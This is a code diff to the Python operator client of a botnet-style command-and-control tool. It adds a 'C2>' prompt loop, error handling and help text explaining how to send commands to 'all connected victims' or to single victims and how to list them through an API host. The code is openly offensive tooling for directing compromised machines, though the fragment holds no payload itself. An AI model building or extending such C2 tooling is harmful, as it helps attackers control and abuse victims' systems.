@@ -24,26 +24,28 @@ def recvStr():
 
 def clientInterface():
     jsonObj = {}
-    print(cli.getpeername())
+    print("Use Target to specify a target: \n\tTarget=*\nThis will send a command to all connected victims.\nSome commands need to be issued to the API host, this can be done utilizing the following syntax: \nTarget="+ str(cli.getpeername()) + "\n\nIf targeting the API Host you should only specify the command of \"List Connections\"\n E.G.\n\tTarget="+str(cli.getpeername()) + " Command=\"List Connections\"\nThis command will list all currently connected victims. You may specify a victim the same way you target the API host to send individual commands\n")
     jsonObj["Target"] = str(cli.getpeername())
     jsonObj["Command"] = "List Connections"
     sendStr(json.dumps(jsonObj))
     print(recvStr())
-    jsonObj["Target"] = "*"
-    jsonObj["Command"] = "test queue"
-    print(json.dumps(jsonObj))
     while True:
-        Com = input("C2> ")
-        print(Com)
-        tgt = re.match(r".*Target\s*=\s*(\(.*\)|\*).*",Com)
-        c = re.match(r".*Command\s*=\s*(\".*\"|\S*).*", Com)
-        Target = str(tgt.groups()[0])
-        Command = str(c.groups()[0].replace("\"", ""))
-        sendStr("{ \"Target\": \""+ Target +"\", \"Command\": \"" + Command +"\"}" )
-        #print(Command)
-        #print (command.groups()[0])
-        #sendStr(str(Command))
-        print(recvStr())
+        try:
+            Com = input("C2> ")
+            if Com =="exit":
+                break
+
+            tgt = re.match(r".*Target\s*=\s*(\(.*\)|\*).*",Com)
+            c = re.match(r".*Command\s*=\s*(\".*\"|\S*).*", Com)
+            Target = str(tgt.groups()[0])
+            Command = str(c.groups()[0].replace("\"", ""))
+            sendStr("{ \"Target\": \""+ Target +"\", \"Command\": \"" + Command +"\"}" )
+            #print(Command)
+            #print (command.groups()[0])
+            #sendStr(str(Command))
+            print(recvStr())
+        except:
+            print("Invalid Syntax, use Target to specify a target: \n\tTarget=*\nThis will send a command to all connected victims.\nSome commands need to be issued to the API host, this can be done utilizing the following syntax: \nTarget="+ str(cli.getpeername()) + "\n\nIf targeting the API Host you should only specify the command of \"List Connections\"\n E.G.\n\tTarget="+str(cli.getpeername()) + " Command=\"List Connections\"\nThis command will list all currently connected victims. You may specify a victim the same way you target the API host to send individual commands\n")
     cli.close()
 
 if __name__ == '__main__':
